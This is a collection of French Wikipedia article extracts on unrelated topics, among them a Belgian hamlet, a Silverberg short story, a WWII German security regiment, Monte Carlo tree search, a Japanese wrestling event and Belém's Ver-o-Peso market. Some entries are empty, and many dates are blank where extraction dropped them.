Dans un environnement de prairies, Filly est un beau hameau rural de caractère comptant entre autres une bonne quinzaine d'anciennes fermes et fermettes bâties principalement en pierre du pays (schiste). Parmi celles-ci, au , la ferme Jacqmin construite au milieu du , est une ferme en carré couverte de cherbins (ardoises brutes) reprise sur la liste du patrimoine immobilier classé de Houffalize. Au centre du village, l'abreuvoir et l'ancien lavoir sont alimentés par le minuscule ruisseau de Filly.
À voir.
Au nord du hameau, se trouve le monument Europalia, une sculpture monumentale en marbre rose du Portugal, inauguré en 1991. Il comprend un portique stylisé en forme de dolmen comprenant 12 éléments représentant à cette époque les 12 pays de l'Union européenne.

</doc>
<doc id="9623743" url="https://fr.wikipedia.org/wiki?curid=9623743" title="Le Jour où le passé a disparu">
Le Jour où le passé a disparu

Le Jour où le passé a disparu (titre original : "") est une nouvelle de science-fiction de Robert Silverberg. 
Publications.
Entre 1957 et 2014, la nouvelle a été éditée à une trentaine de reprises dans des recueils de nouvelles de Robert Silverberg ou des anthologies de science-fiction.
Publications aux États-Unis.
La nouvelle a été écrite en novembre-, mais n'est parue qu’en octobre 1969 sous le titre ' dans l'anthologie "Trois futurs incertains" (', anthologie parue en 1969 aux États-Unis et en 1972 en France), composée et dirigée par Robert Silverberg.
Elle a ensuite été régulièrement rééditée dans divers recueils de Robert Silverberg et diverses anthologies.
Publications en France.
La nouvelle a été publiée en France en 1972 sous le titre "Le jour où le passé fut aboli" dans l'anthologie "Trois futurs incertains", "Fiction Spécial" , Éditions OPTA.
Trente ans après, elle est de nouveau publiée en 2002 dans le recueil "Le Chemin de la nuit", avec une traduction de Pierre-Paul Durastanti, avec une réédition en livre de poche chez J'ai lu en 2004.
Elle est donc l'une des 124 meilleures nouvelles de Silverberg sélectionnées pour l'ensemble de recueils "Nouvelles au fil du temps", dont "Le Chemin de la nuit" est le premier tome.
Publication en Grande-Bretagne.
La nouvelle a été publiée en Grande-Bretagne dans l'anthologie " (1991).
Publications dans d'autres pays occidentaux.
La nouvelle a aussi été publiée :
Résumé.
En , un « maniaque antisocial » répand un produit chimique amnésiant (« terminase d'acétilcholine ») dans le réseau d'alimentation en eau de l'agglomération de San Francisco. On suit le destin de plusieurs personnes affectées par la perte de mémoire, totale ou partielle, entraînée par cet acte de terrorisme :
La nouvelle montre donc comment des personnes différentes sont touchées, en bien ou en mal, par cette amnésie, et comment elles réagissent face à ce sentiment que l'Absurde surgit dans leur vie.
La nouvelle se termine par l'annonce de la création d'une nouvelle secte mystique qui compte des milliers d'adeptes, "L’Église de l'oubli" ; cette secte vient d'être créée par Nate Haldersen et son objet est de faire boire des produits amnésiant à des volontaires pour oublier un passé vécu comme négatif ou destructeur.

</doc>
<doc id="9623750" url="https://fr.wikipedia.org/wiki?curid=9623750" title="1000e régiment de sécurité">
1000e régiment de sécurité

Le régiment de sécurité (en allemand ) était un régiment des "Sicherungstruppen" allemandes destinée à la répression et à l’anéantissement des maquisards, limousins et auvergnats en particulier, et qui sévit dans ces régions de mars-avril à .
Historique.
Le mot. Sicherungs-Regiment 100 est créé en France en comme une unité motorisée de sécurité avec un état-major, une compagnie de chars et 2 bataillons.
Chaque bataillon était composé de 4 compagnies d'infanterie motorisée et anti-aérienne.
Le régiment est rattaché au "Militärbefehlshaber Frankreich".
En , le régiment est rebaptisé Sicherungs-Regiment 1000 (1000 régiment de sécurité et parfois appelé Grenadier-Regiment (motorisiert) 1000), et dirigé à Montargis et Briare pour être rapidement opérationnel.
En , la Sicherungs brigade 74 est créée, à Montargis et Briare, avec le Sicherungs-Regiment 1000, le Sicherungs-Regiment 1010 et l'Aufklärungs-Abteilung 1000, afin de pouvoir intervenir rapidement contre de potentielles opérations parachutistes alliées sur la région Parisienne.
Inclus dans la brigade de repression du général Jesser, la Sicherungs-Brigadestab 74 sera finalement employée pour réprimer et anéantir les groupes de maquisards, en Auvergne et dans le Limousin, de juin à . Engagé en mai et juin dans la bataille du Mont Mouchet puis en juillet dans le Limousin, le 1000 régiment de sécurité sème ensuite la terreur de Clermont-Ferrand à Tulle, le long de la route nationale 89 comme à Ussel.
En , en raison du débarquement de Provence, l'ensemble de la brigade reçoit un ordre de repli immédiat vers l'est.
Le , le Sicherungs-Regiment 1000 est renommée Grenadier-Regiment 1212 et rattaché à la d'infanterie dans la et prend part aux combats en Alsace, en particulier lors des combats pour la trouée de Belfort et la poche de Colmar.
En , la 189. Infanterie-Division est détruite dans la poche de Colmar. Les quelques débris du Grenadier-Regiment 1212 parvenu à quitter l'Alsace sont rattachés à la d'infanterie (Division Nr. 805) qui sera elle-même absorbée, en , par la 352 Volksgrenadier Division

</doc>
<doc id="9623751" url="https://fr.wikipedia.org/wiki?curid=9623751" title="Neustadt (Westerwald)">
Neustadt (Westerwald)



</doc>
<doc id="9623766" url="https://fr.wikipedia.org/wiki?curid=9623766" title="Bataille de Jackson (Tennessee)">
Bataille de Jackson (Tennessee)

La bataille de Jackson, appelée aussi bataille de Salem Cemetery, s'est déroulée le , dans le comté de Madison, Tennessee, pendant la guerre de Sécession.
Contexte.
Les combats à Jackson surviennent pendant l'expédition dans le Tennessee occidental du brigadier général confédéré Nathan Bedford Forrest, entre le et le . Forrest souhaite interrompre la ligne de ravitaillement de l'armée du major général Ulysses S. Grant, qui mène une campagne en aval de la voie ferrée du Mississippi central. S'il peut détruire la voie ferrée de Mobile &amp; Ohio qui court vers le sud à partir de Columbus, Kentucky, passant par Jackson, Tennessee, Grant devra abréger ou stopper ses opérations. La brigade de cavalerie de Forrest, forte de hommes, traverse la rivière Tennessee entre le et le , se dirigeant vers l'ouest. Grant ordonne une concentration de troupes à Jackson sous le commandement du brigadier général Jeremiah C. Sullivan et envoie une force de cavalerie, commandée par le colonel Robert G. Ingersoll combattre Forrest. Néanmoins, Forrest écrase la cavalerie de l'Union à Lexington le .
Bataille.
Alors que Forrest poursuit son avance le lendemain, Sullivan donne l'ordre au colonel Adolph Englemann de prendre une petite force au nord-est de Jackson. À Old Salem Cemetery, en position défensive, les deux régiments infanterie d'Englemann repoussent une attaque montée confédérée et se retirent alors de () en direction de la ville. Pour Forrest, le combat n'est autre qu'une feinte et le moyen de fixer les défenseurs unionistes à Jackson sur place pendant que deux colonnes montées détruisent les voies de chemin de fer au nord et au sud de la ville et repartent. Une fois fait, Forrest se retire de la région de Jackson pour attaquer Trenton et Humboldt. Ainsi, bien que les fédéraux aient réussi leur démonstration face à une partie de la force de Forrest, la réussite majeure est que les autres confédérés ont rempli un des objectifs de l'expédition.

</doc>
<doc id="9623767" url="https://fr.wikipedia.org/wiki?curid=9623767" title="Selters (Rhénanie-Palatinat)">
Selters (Rhénanie-Palatinat)



</doc>
<doc id="9623780" url="https://fr.wikipedia.org/wiki?curid=9623780" title="Franz Kullak">
Franz Kullak

Franz Kullak (né le à Berlin – décédé le dans la même ville) est un pianiste, compositeur et professeur de musique prussien.
Biographie.
Kullak, fils de Theodor Kullak, a étudié à la "Neue Akademie der Tonkunst" créée par son père à Berlin. Il a repris la direction de cette école après la mort de son père en 1882 et cela jusqu'en 1890, date de dissolution de l'Académie.
Compositions.
Comme œuvres d'enseignement, il a publié :
Il a composé un grand opéra en 5 actes "Ines de Castro" (Berlin, 1877), une "Jubiläumsouvertüre", des pièces pour piano et des lieder. En outre, il a transcrit pour le piano de nombreuses œuvres orchestrales (par exemple de Mozart et de Beethoven) et a travaillé comme critique musical et éditeur.

</doc>
<doc id="9623783" url="https://fr.wikipedia.org/wiki?curid=9623783" title="Presqu'île de Sainte-Anne">
Presqu'île de Sainte-Anne

La presqu'île de Sainte-Anne est une presqu'île formant l'extrémité sud-est de la Martinique. 
Géographie.
Il s'agit d'une région aride et particulièrement ensoleillée. Très touristiques, les deux communes qui l'occupent, Le Marin et Sainte-Anne, sont les seules à présenter à la fois une façade caraïbe et une façade atlantique. 
Les plages de la presqu'île sont réputées.

</doc>
<doc id="9623789" url="https://fr.wikipedia.org/wiki?curid=9623789" title="Egidio Riccardi">
Egidio Riccardi

Egidio Riccardi (mort en 1545) est un carme, d'origine italienne, théologien, procureur général et réformateur de son Ordre, sous le généralat de Nicolas Audet.
Biographie.
Egidio Riccardi est né à Gand (Belgique), de parents italiens. Entré chez les carmes de sa ville natale, il est élu procureur de l'Ordre, au chapitre général de 1532. À partir de mai 1534, il s'installe à Rome et devient le délégué du prieur général Nicolas Audet, lequel visait un retour des carmes à la stricte observance. À cet effet, Egidio fait la tournée des couvents de certaines provinces d'Italie dans le but d'y introduire la réforme. De plus, étant donné que la Curie romaine compromettait les efforts des réformateurs, en faisant commerce des dispenses et des bénéfices, il va présenter, sur base des Évangiles et des lettres pauliniennes, la figure spirituelle idéale de l’Église et de la hiérarchie, à travers une série de dix discours, prononcés entre 1535 et 1540, devant Paul III et ses cardinaux. Spécialiste de l'exégèse, il enseigne encore à la faculté de la Sapienza, où il commente l'évangile de Matthieu et les épîtres de Paul. Pressenti par Audet pour siéger, en tant que théologien, au Concile de Trente, il décède, peu de temps avant l'ouverture de celui-ci, le .

</doc>
<doc id="9623790" url="https://fr.wikipedia.org/wiki?curid=9623790" title="Dashi Namdakov">
Dashi Namdakov

Dashinima (Dashi) Balzhanovich Namdakov, généralement appelé Dashi Namdakov (en russe : ), né le à Ukurik, est un sculpteur bouriate, membre de l'Union des artistes russes.
Originaire d'une région où la religion bouddhique et la mythologie shamanique se mélangent, il est inspiré par les peuples turques de Sibérie, les contes et légendes épiques bouriates et les arts de Chine et du Japon. Son travail utilise le bronze, le bois, parfois des pierres précieuses
Biographie.
Dashi Namdakov est né le dans le village bouriate de Ukurik, , dans l'Oblast de Tchita (aujourd'hui, Kraï de Transbaïkalie), en fédération de Russie. Son nom bouriate est "Dashinima" ("Dashi Nima") qui signifie dans cette langue, "Soleil chanceux". Il est le sixième enfant, parmi huit de Balzhan et Buda-Khanda Namdakov.
La famille de Dashi descend d'une famille de forgerons.
Il dessine la pochette de l'album "Khatar" () du groupe bouriate Namgar, en 2003.
En , il expose au Kremlin de Kazan.
Il expose un portrait en Bronze de Genghis Khan à la galerie Halcyon, près de Hyde Park, à Londres, le . Le , sa sculpture intitulée « "" » est installée dans Hyde Parc.
Il expose au National Arts Club de New York en .

</doc>
<doc id="9623794" url="https://fr.wikipedia.org/wiki?curid=9623794" title="Terry's">
Terry's

Terry's est une chocolaterie de la ville de York en Angleterre, active dès le . C'est une filiale du groupe français Carambar &amp; Co du groupe d'investissement français Eurazeo.
Historique.
Terry's trouve son origine dans la société Bayldon and Berry confectionery fondée en 1767 par William Bayldon et Robert Berry. En 1823, Joseph Terry épouse Harriet Atkinson qui appartient à la famille de Robert Berry. Il abandonne peu après sa boutique et rejoint l'entreprise avant d'en reprendre la direction en compagnie de George Berry, fils de l'un des fondateurs. L'entreprise prend alors le nom de "Terry &amp; Berry". En 1828, George quitte la chocolaterie, Joseph Terry dirige alors seul l'entreprise. 
Joseph Terry meurt en 1850, peu après avoir pris sa retraite et transmis la direction de l'entreprise à son fils qui a développé l'entreprise qui commençait alors à se faire un nom en Angleterre. En 1926, l'entreprise s'installe dans de nouveaux locaux au sud de York : "The Chocolate Works." C'est ici que sont créés des produits emblématiques de Terry's parmi lesquels les "Terry's Chocolate Orange". 
La société a été rachetée en 1993 par la multinationale Kraft foods qui a décidé de fermer l'usine de York le .
En 2018, à la suite du rachat de la marque à Mondelez International l'année précédente, Carambar &amp; Co rapatrie la production sur son usine de Strasbourg. La marque investit pour cela 10 millions d'euros dans une nouvelle ligne de production.

</doc>
<doc id="9623812" url="https://fr.wikipedia.org/wiki?curid=9623812" title="Famille d'Hirayama">
Famille d'Hirayama



</doc>
<doc id="9623822" url="https://fr.wikipedia.org/wiki?curid=9623822" title="Formule de Baker-Campbell-Hausdorff">
Formule de Baker-Campbell-Hausdorff

En mathématiques, la formule de Baker-Campbell-Hausdorff est la solution Z de l'équation :
où formula_2, formula_3 et formula_4 sont des matrices, ou plus généralement des éléments d'une algèbre de Lie d'un groupe de Lie.
Expression.
Énoncé général.
Avec les crochets de Lie, la formule de Baker-Campbell-Hausdorff s'écrit :
Une formule reliée est la formule de Zassenhaus :
Cas particuliers.
Lorsque formula_2et formula_3 commutent, on a formula_9.
Lorsque formula_2 et formula_3 commutent avec leur commutateur (c'est-à-dire formula_12) le résultat se restreint à la formule dite de Glauber :
Ce cas particulier est souvent utile en physique quantique avec les opérateurs position et impulsion formula_2 et formula_15.
Notes et références.
[[Catégorie:Combinatoire]]
[[Catégorie:Exponentielle]]
[[Catégorie:Groupe de Lie]]
[[Catégorie:Physique mathématique]]

</doc>
<doc id="9623823" url="https://fr.wikipedia.org/wiki?curid=9623823" title="Rachel Elliott">
Rachel Elliott

Rachel Elliott est une soprano britannique principalement active, en concert et au disque, dans le domaine de l'interprétation de la musique baroque.
Formation.
Rachel Elliott étudie le piano à la Purcell School, avant d'entamer des études musicales au Selwyn College, à Cambridge.
Elle consacre ensuite deux années au cours de musique ancienne de la Guildhall School of Music and Drama à Londres, où son professeur de chant est David Pollard.
Carrière.
Rachel Elliott est membre de l'ensemble I Fagiolini avec lequel elle a fait beaucoup de tournées.
Elle chante avec des ensembles britanniques comme The Academy of Ancient Music, The Orchestra of the Age of Enlightenment, Florilegium, Concordia, New London Consort et The Bach Players. 
Elle chante également avec des ensembles français comme Les Arts Florissants et Il Seminario Musicale, et collabore régulièrement avec l'ensemble espagnol Hippocampus.
Discographie sélective.
Rachel Elliott a participé à de nombreux enregistrements publiés sur les labels Pilips, ASV / Gaudeamus, Chandos, Virgin Veritas, Metronome, Hyperion, Naxos, Linn et Arsis :

</doc>
<doc id="9623833" url="https://fr.wikipedia.org/wiki?curid=9623833" title="Japon aux Jeux olympiques d'été de 1996">
Japon aux Jeux olympiques d'été de 1996

Le Japon participe aux Jeux olympiques d'été de 1996 à Atlanta aux États-Unis. 306 athlètes japonais, 157 hommes et 149 femmes, ont participé à 168 compétitions dans 27 sports. Ils y ont obtenu 14 médailles : 3 d'or, 6 d'argent et 5 de bronze.

</doc>
<doc id="9623836" url="https://fr.wikipedia.org/wiki?curid=9623836" title="Johann II von Blankenfeld (1471-1527)">
Johann II von Blankenfeld (1471-1527)



</doc>
<doc id="9623839" url="https://fr.wikipedia.org/wiki?curid=9623839" title="Johann III. von Blankenfeld">
Johann III. von Blankenfeld



</doc>
<doc id="9623840" url="https://fr.wikipedia.org/wiki?curid=9623840" title="Crochets de Lie">
Crochets de Lie



</doc>
<doc id="9623866" url="https://fr.wikipedia.org/wiki?curid=9623866" title="René Jacques Morisset">
René Jacques Morisset

René Jacques Morisset est un homme politique français né le à Niort et ùprt le à Paris.
Biographie.
Avocat en 1786, il est lieutenant criminel à Niort en 1788. Partisan de la Révolution, il est administrateur du district en 1790, maire de Niort en 1791 et administrateur du département en 1792. Il est conseiller général en 1800 et créé baron d'Empire. Il est député des Deux-Sèvres de 1813 à 1815, siégeant au centre. Il se rallie aux Bourbons en 1814. Il est de nouveau député de 1816 à 1822, siégeant toujours au centre.

</doc>
<doc id="9623881" url="https://fr.wikipedia.org/wiki?curid=9623881" title="Mashike">
Mashike

 est un bourg du district de Mashike, situé dans la sous-préfecture de Rumoi, sur l'île de Hokkaidō, au Japon.
Géographie.
Démographie.
Au , la population de Mashike s'élevait à répartis sur une superficie de .
Transport.
Mashike était desservie par la ligne Rumoi de la compagnie JR Hokkaido jusqu'en . Il n'y a désormais plus de train circulant à Mashike.

</doc>
<doc id="9623889" url="https://fr.wikipedia.org/wiki?curid=9623889" title="Laurent d'Abbadie">
Laurent d'Abbadie

Laurent d'Abbadie d'Ithorots est un homme politique français né le à Pau, et mort le à Aroue-Ithorots-Olhaïby.
Biographie.
Fils de Jean d'Abbadie d'Ithorrotz, baron de Saint-Loup et seigneur de Bizanos, conseiller du roi en tous ses conseils, président à mortier au Parlement de Navarre, et neveu de Laurent Lafaurie de Monbadon, il prend part aux guerres de Vendée et hérite du château de Saint-Loup-sur-Thouet. 
Il devient conseiller général en 1815 et député des Deux-Sèvres de 1824 à 1827, siégeant à droite. 
Il participe à la tentative de retour de la duchesse de Berry, en .

</doc>
<doc id="9623893" url="https://fr.wikipedia.org/wiki?curid=9623893" title="Pierre Brasseur (voile)">
Pierre Brasseur (voile)



</doc>
<doc id="9623899" url="https://fr.wikipedia.org/wiki?curid=9623899" title="Antoine Siguy">
Antoine Siguy

Antoine Siguy, né le à Toulouse (Haute-Garonne), mort le à Saint-Malo (Ille-et-Vilaine), est un colonel français de la Révolution et de l’Empire.
États de service.
Il entre en service le , comme soldat au régiment de Condé infanterie, et l’année suivante il embarque sur le vaisseau « "le Zodiaque" », avec lequel il fait la campagne sur mer. Il se trouve au combat d’Ouessant le , et il est congédié le .
Au moment de la Révolution, il reprend du service le , comme capitaine de grenadiers dans le de volontaire de Haute-Garonne, et il fait les campagnes de 1792 à l’an VI, aux armées des Alpes, d’Italie, et en Suisse. Le , à la bataille du pont de Lodi, il s’élance à la tête de ses grenadiers, dans la ville et désarme plusieurs autrichiens qu’il fait conduire au quartier général. Chargé le même jour de s’emparer de la tête de pont et d’empêcher l’ennemi de la couper, il remplit sa mission avec un plein succès, malgré le feu meurtrier des autrichiens. Le , lors du passage du Mincio, il traverse le fleuve à la tête de sa compagnie, et parvenu sur l’autre rive, il contribue à en chasser les autrichiens sui sont mis en déroute.
En 1798, il est appelé à faire la campagne d'Égypte, et le lors de la bataille des Pyramides, avec ses grenadiers, il enlève une batterie de 20 pièces de canon. Son sous-lieutenant est tué à ses côtés, et lui-même à ses habits et son chapeau criblé de balles. A la prise de Jaffa le , il se conduit avec une rare intrépidité, ainsi que pendant le siège de Saint-Jean-d’Acre, où il ne manque aucune occasion de faire preuve de bravoure et de dévouement. Lors de ce siège, il a déjà pris part à dix assauts lorsque le dans une onzième tentative faite contre le corps de place, il est atteint d’un coup de feu qui lui fracasse la jambe droite. Sa conduite pendant cette journée, lui vaut un sabre d’honneur, et le général en chef Kléber le nomme chef de bataillon provisoire le .
Confirmé dans son grade le , il devient titulaire le , dans la d’infanterie de ligne. Atteint de surdité et inapte au service actif à la suite des blessures reçues, il est proposé par le général Junot commandant la militaire, pour un commandement de . Le premier Consul voulant récompenser les bons services de cet officier, le nomme colonel commandant d’armes à Saint-Malo le , et le fait officier de la Légion d’honneur le .
Il meurt dans l’exercice de ses fonctions le à Saint-Malo.

</doc>
<doc id="9623903" url="https://fr.wikipedia.org/wiki?curid=9623903" title="Jean Joseph Tonnet-Hersant">
Jean Joseph Tonnet-Hersant

Jean Joseph Tonnet-Hersant est un homme politique français né le à Saint-Loup-sur-Thouet (Deux-Sèvres) et mort le à Boirateau (Deux-Sèvres).
Biographie.
Ancien élève de l'école polytechnique et de l'école d'artillerie de Metz, il fait les campagnes napoléoniennes. Capitaine en 1812, il devient inspecteur d'artillerie à Dresde et quitte l'armée en 1816.
Maire d'Ardin, conseiller général du canton de Coulonges, il est député des Deux-Sèvres de 1828 à 1829, siégeant dans la majorité constitutionnelle.

</doc>
<doc id="9623905" url="https://fr.wikipedia.org/wiki?curid=9623905" title="District de Mashike">
District de Mashike

Le est un district de la sous-préfecture de Rumoi au Japon.
Au , sa population était estimée à habitants pour une superficie de .

</doc>
<doc id="9623906" url="https://fr.wikipedia.org/wiki?curid=9623906" title="Andre Frolov">
Andre Frolov

Andre Frolov, né le à Emmaste en Estonie, est un footballeur international estonien, qui évolue au poste de milieu de terrain.
Biographie.
Carrière de joueur.
Andre Frolov dispute deux matchs en Ligue des champions, et 4 matchs en Ligue Europa.
Carrière internationale.
Andre Frolov compte trois sélections avec l'équipe d'Estonie depuis 2012. 
Il est convoqué pour la première fois par le sélectionneur national Tarmo Rüütli pour un match amical contre Oman le (victoire 2-1).

</doc>
<doc id="9623907" url="https://fr.wikipedia.org/wiki?curid=9623907" title="Tiberius Æmilius Mamercinus (consul en -339)">
Tiberius Æmilius Mamercinus (consul en -339)

Tiberius Aemilius Mamercinus est un homme politique de la République romaine du , consul en 339
Famille.
Il est membre des "", branche de l'illustre "gens" patricienne des "Aemilii". Il pourrait être un proche parent de Lucius Aemilius Mamercinus Privernas, consul en 341 et 329, peut-être son frère. Pour l'année 339, Tite-Live donne le "praenomen Titius", Cassiodore donne "Titus" tandis que Diodore de Sicile donne "Tiberius".
Biographie.
"Quinquevir Mensarius" (352).
Tiberius Aemilius a pu faire partie d'une commission spéciale de "quinqueviri mensarii" avec Caius Duillius, Publius Decius Mus, Marcus Papirius et Quintus Publilius Philo. Ils sont nommés afin de gérer l'allègement de la charge de l'intérêt des dettes en procédant à la liquidation de certaines dettes pour permettre un retour à la concorde entre les différentes couches sociales de Rome.
Préture (341).
Tiberius Aemilius est identifié au préteur de 341 qui introduit les ambassadeurs samnites auprès du Sénat pour renouveler le traité d'alliance entre la République romaine et la confédération samnite, marquant la fin de la première guerre samnite.
Consulat (339).
Tiberius Aemilius devient consul en 339 avec le plébéien Quintus Publilius Philo pour collègue. Il accompagne son collègue qui part en campagne contre les Latins et qui sont défaits dans les plaines de Fenectum. Alors que Quintus Publilius reçoit la soumission des Latins, Tiberius Aemilius prend le commandement de l'armée contre la ville de Pedum qui est soutenue par Tibur, Préneste et Velitrae mais aussi par des contingents envoyés par Lanuvium et Antium. Tiberius Aemilius sort vainqueur de la confrontation mais ne parvient pas à s'emparer de Pedum. De plus, apprenant que son collègue s'est vu décerner l'honneur de célébrer un triomphe par le Sénat pour sa victoire sur les Latins, Tiberius Aemilius renonce à poursuivre sa campagne et revient à Rome pour demander le même traitement. Devant le refus du Sénat étant donné que Pedum n'est pas tombée, Tiberius Aemilius rompt les négociations avec les sénateurs et entame une politique très critique envers le patriciat, s'appuyant sur le ressentiment de la plèbe causé par un partage inégal des terres prises quelques années plus tôt sur les Latins et sur Falerne en Campanie, que son collègue plébéien soutient par sa passivité. Lorsque le Sénat demande qu'un dictateur soit nommé pour prendre en main les opérations militaires contre les Latins qui se sont à nouveau révoltés, Tiberius Aemilius nomme son propre collègue qui en profite, selon Tite-Live, pour faire passer plusieurs mesures populaires dont trois lois importantes : les plébiscites s'appliquent à tout le peuple romain, les lois présentées devant les comices centuriates sont ratifiées avant par le Sénat et un des deux censeurs doit être plébéien.

</doc>
<doc id="9623915" url="https://fr.wikipedia.org/wiki?curid=9623915" title="St. Helena (Caroline du Nord)">
St. Helena (Caroline du Nord)

 est une ville américaine située dans le comté de Pender dans l'État de Caroline du Nord. En 2010, sa population était de .

</doc>
<doc id="9623925" url="https://fr.wikipedia.org/wiki?curid=9623925" title="Watha (Caroline du Nord)">
Watha (Caroline du Nord)



</doc>
<doc id="9623926" url="https://fr.wikipedia.org/wiki?curid=9623926" title="Recherche arborescente Monte-Carlo">
Recherche arborescente Monte-Carlo

En informatique, et plus précisément en intelligence artificielle, la recherche arborescente Monte Carlo ou Monte Carlo tree search (MCTS) est un algorithme de recherche heuristique utilisé dans le cadre de la prise de décision. Il est notamment employé dans les jeux. On peut citer son implémentation dans le jeu vidéo avec son mode campagne IA haut-niveau et les récents programmes informatiques de Go, suivis par les échecs et shogi, ainsi que les jeux vidéo en temps réel et les jeux à information incomplète tels que le poker.
Principe.
L'algorithme MCTS est un algorithme qui explore l'arbre des possibles. La racine est la configuration initiale du jeu. Chaque nœud est une configuration et ses enfants sont les configurations suivantes. MCTS conserve en mémoire un arbre qui correspond aux nœuds déjà explorés de l'arbre des possibles. Une feuille de cet arbre (un nœud n'ayant pas d'enfants) est soit une configuration finale (i.e. on sait si un des joueurs a gagné, ou s'il y a match nul), soit un nœud dont aucun enfant n'a encore été exploré. Dans chaque nœud, on stocke deux nombres : le nombre de simulations gagnantes, et le nombre total de simulations. Chaque étape est composée de quatre phases.
Exploitation et exploration.
La difficulté principale est dans la phase de sélection. Il faut sélectionner successivement les enfants jusqu'à atteindre une feuille. Pour cela, on maintient un compromis entre l"exploitation" des choix qui ont l'air prometteurs et l"'exploration" des nœuds à partir desquels peu de simulations ont été réalisées. La première formule pour ce compromis entre exploitation et exploration, qui s'appelle UCT ("Upper Confidence Bound" 1 "applied to Trees") était introduit par Levente Kocsis et Csaba Szepesvári. UCT est basée sur la formule UCB1 de Auer, Cesa-Bianchi et Fischer et l'algorithme AMS (Adaptive Multi-stage Sampling) a été appliqué à la décision multi-étage par Chang, Fu, Hu, et Marcus. Kocsis et Szepesvári recommandent de choisir le successeur i, en chaque nœud de l'arbre, pour lequel l'expression formula_1 a la valeur maximale. Dans cette formule :
La première partie de la formule, formula_6 correspond à l'exploitation ; la fraction est grande pour les successeurs qui ont eu beaucoup de succès jusque là. La seconde partie correspond à l'exploration ; elle est grande pour des successeurs qui n'ont été impliqués que dans peu de simulations.
Les implémentations plus modernes de MCTS sont basées sur une variante de UCT, cf. les travaux de Chang et al. (2005) à .

</doc>
<doc id="9623927" url="https://fr.wikipedia.org/wiki?curid=9623927" title="Winfall (Caroline du Nord)">
Winfall (Caroline du Nord)



</doc>
<doc id="9623931" url="https://fr.wikipedia.org/wiki?curid=9623931" title="Secrétaire au Commerce extérieur">
Secrétaire au Commerce extérieur

Le secrétaire au Commerce extérieur était une position ministérielle junior dans le gouvernement britannique de 1917 jusqu'en 1953 , subordonné du président de la Chambre de commerce. Il a été remplacé par le ministre d'État pour le commerce le .

</doc>
<doc id="9623936" url="https://fr.wikipedia.org/wiki?curid=9623936" title="Wrestle Kingdom 10 in Tokyo Dome">
Wrestle Kingdom 10 in Tokyo Dome

L’édition 2016 de "Wrestle Kingdom" est une manifestation de catch télédiffusée et visible en paiement à la séance, sur SKY PerfecTV! ou en streaming payant via Ustream ou sur . L'événement, produit par la "" ("NJPW"), a eu lieu le au Tokyo Dome à Tokyo, dans la région du Kantō. Ce spectacle est le plus grand évènement de puroresu et se déroule chaque année le au Tokyo Dome depuis 1994. Il s'agit de la dixième édition de "Wrestle Kingdom" et du annuel au Tokyo Dome.
Contexte.
Les spectacles de la "" en paiement à la séance sont constitués de matchs aux résultats prédéterminés par les scénaristes de la NJPW. Ces rencontres sont justifiées par des "storylines" — une rivalité avec un catcheur, la plupart du temps — ou par des qualifications survenues dans les shows précédents. Tous les catcheurs possèdent une gimmick, c'est-à-dire qu'ils incarnent un personnage gentil ou méchant, qui évolue au fil des rencontres. Un "pay-per-view" comme "Wrestle Kingdom" est donc un événement tournant pour les différentes "storylines" en cours.
Kazuchika Okada contre Hiroshi Tanahashi.
Le , Hiroshi Tanahashi remporte le tournoi "G1 Climax" en battant en finale Shinsuke Nakamura, lui donnant une opportunité pour le championnat poids-lourd IWGP. Il affrontera la champion en titre Kazuchika Okada pour la troisième fois pour le titre suprême lors de "Wrestle Kingdom".
Shinsuke Nakamura contre A.J. Styles.
Le , lors de "Power Struggle 2015", Shinsuke Nakamura conserve son titre intercontinental IWGP en battant Karl Anderson. Peu après sa victoire, il remet sa ceinture en jeu contre un autre membre du Bullet Club, A.J. Styles.
Bullet Club contre Great Bash Heel.
Le , les deux membres du Great Bash Heel (Tomoaki Honma et Hirooki Goto) battent Los Ingobernables de Japón (Evil et Tetsuya Naito) et remportent le "World Tag League 2015". Cette victoire leur assure un match de championnat pour les ceintures par équipe IWGP, détenues par le Bullet Club.
Jay Lethal contre Michael Elgin.
Le , Michael Elgin remporte le tournoi "Survival of the Fittest 2015", un tournoi de la Ring of Honor, lui donnant une opportunité pour le titre mondial de la ROH. Il réclame ensuite d'avoir son match pour le titre au Japon. Le , Jay Lethal conserve son titre en battant A.J. Styles. C'est la première fois que ce titre sera défendu lors de "Wrestle Kingdom".

</doc>
<doc id="9623942" url="https://fr.wikipedia.org/wiki?curid=9623942" title="Marché Ver-o-Peso">
Marché Ver-o-Peso

Le marché Ver-o-Peso est un marché situé dans la ville de Belém au Brésil dans l'État du Pará et se trouve sur l'Avenue Boulevard Castilho Franca, (Vieille Ville) sur les rives de la baie de Guajará. Lieu touristique et culturel de la ville, il est considéré comme le plus grand marché en plein air d'Amérique latine. Le marché de Ver-o-Peso alimente la ville avec toutes sortes de denrées alimentaires et d'herbes médicinales venant de l'intérieur du Pará, principalement apportées par le fleuve. Il a été candidat pour être l'une des . Inauguré en 1901, c'est un des plus anciens marchés publics du Brésil.
Histoire.
Au , dans une zone formée par l'igarapé de Piri où se trouve aujourd'hui le marché Ver-o-Peso, les Portugais ont établi un point de contrôle et de taxes des denrées apportées au quartier général de la capitainerie (Belém-PA). Ce poste fut nommé "Casa de Haver o Peso" (Maison de Avoir du Poids) et devait également contrôler le poids des produits commercialisés. Au début du , l'igarapé Piri fut bouché et les docks de Ver-o-Peso furent construits dans son embouchure. 
Bien que la ville ait été secouée par la révolte populaire appelée Cabanagem (1835-1840), la Maison est restée en activité jusqu'à la moitié de l'année 1839. Au mois d'octobre de cette même année, la répartition fut supprimée et la Maison fut louée et destinée à la vente de poisson frais.
En 1847, à la fin du contrat de location, la Maison fut démolie et on commença la construction des Marchés de Poisson et de Viande, ce dernier également connu sous le nom de Marché Municipal ou Marché Bolonha, ayant été construit par l'ingénieur Francisco Bolonha.
Lors du cycle du caoutchouc, entre la fin du , Belém eut une grande importance commerciale, surtout sur la scène internationale. Pendant cette période, nous pouvons également remarquer des changements urbains. D'importants bâtiments furent érigés, parmi lesquels le Palais Lauro Sodré, le Theatro da Paz (Théâtre de la paix), le Palais Antônio Lemos et le Marché Ver-o-Peso.
La construction du Marché du Fer, comme était initialement connu le Marché Ver-o-Peso, fut autorisée par la loi municipale du , et son édification, par le projet de Henrique La Rocque, fut commencée en 1899. Toute la structure en fer du Marché a été apportée d'Europe suivant la tendance française de l'art nouveau de la Belle Époque. Il fut inauguré en 1901.
